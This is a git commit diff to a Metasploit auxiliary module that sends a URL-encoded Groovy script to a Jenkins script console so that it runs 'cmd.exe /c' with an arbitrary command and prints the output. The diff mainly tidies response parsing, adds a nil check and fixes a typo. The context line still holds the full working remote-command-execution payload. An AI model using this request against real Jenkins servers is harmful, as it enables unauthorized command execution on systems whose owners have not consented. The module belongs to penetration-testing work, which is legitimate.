bde4f40c53cad19ce28e8e547131daff0e6236ad
altjx <alton.jx@gmail.com>
2015-09-02 16:39:49 -0400

    Update jenkins_command.rb

--- modules/auxiliary/scanner/http/jenkins_command.rb
+++ modules/auxiliary/scanner/http/jenkins_command.rb
@@ -51,14 +51,17 @@ class Metasploit3 < Msf::Auxiliary
       'method'    => 'POST',
       'ctype'     => 'application/x-www-form-urlencoded',
       'data'      => "script=def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%0D%0Adef+proc+%3D+%27cmd.exe+%2Fc+#{command}%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%22%0D%0A&json=%7B%22script%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27cmd.exe+%2Fc+#{command}%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%5Cnproc.waitForOrKill%281000%29%5Cnprintln+%5C%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%5C%22%5Cn%22%2C+%22%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27cmd.exe+%2Fc+#{command}%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%22%7D&Submit=Run"
-    }).to_s.gsub("err&amp;gt;", "")
-   output = res.scan(/<pre>(.*?)<\/pre>/m)[1][0][12..-1]
+    }).body.to_s
+     
+    unless res.nil?
+      output = res.scan(/<pre>(.*?)<\/pre>/m)[1][0][12..-1].gsub("err&amp;gt;", "")
+    end
 
-   if output.include? "groovy.control.MultipleCompilationErrorsException"
-     print_error("An unown error occurred when running the command.")
-   else
-     print_good("The server responded with the following output:\n")
-     puts CGI.unescapeHTML(output)
-   end
+    if output.include? "groovy.control.MultipleCompilationErrorsException"
+      print_error("An unknown error occurred when running the command.")
+    else
+      print_good("The server responded with the following output:")
+      print_good(output)
+    end
   end
 end
